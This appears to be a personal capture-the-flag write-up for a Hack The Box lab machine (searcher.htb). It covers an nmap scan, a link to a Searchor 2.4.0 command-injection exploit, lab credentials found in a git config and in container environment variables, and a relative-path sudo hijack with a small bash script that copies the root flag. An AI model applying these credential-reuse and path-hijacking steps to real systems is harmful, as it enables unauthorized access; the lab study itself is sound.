#cve #gitea #dynamic-path #password-reuse

# nmap 
```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-04 20:56 CST
Nmap scan report for 10.129.255.151
Host is up (0.0023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.19 seconds

```


# searcher.htb uses searchor v2.4.0 which has an RCE vulnerability
source https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

# Got a shell, found a credentials on the .git directory
```
url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git

```

# The svc user has the same password as cody, I checked the sudo privileges of the user, found it can run system-checkup python script on the /opts directory

# the script allows us to use docker ps and inspect commands 
```shell
gitea:yuiu1hoiu4i5ho1uh
# mysql credentials found

["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea"]
# mysql_db container environment variables
```


# in the gitea repository of the administrator user, the "system-checkup.py" script is present, and the full-checkup action on the script executes a script named "full-checkup.sh" script using a dynamic path


```python
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output

```

# since the script does not have a specific path, it executes a script that has the same name on any directory, 


# so I created a script on my current working directory named full-checkup.sh in the /tmp directory

# the script copies the root flag to the /tmp directory then modifies privileges, got root flag

```shell

vi full-checkup.sh

#!/bin/bash
cp /root/root.txt /tmp/root.txt
chmod 777 /tmp/root.txt
```



completed by following a writeup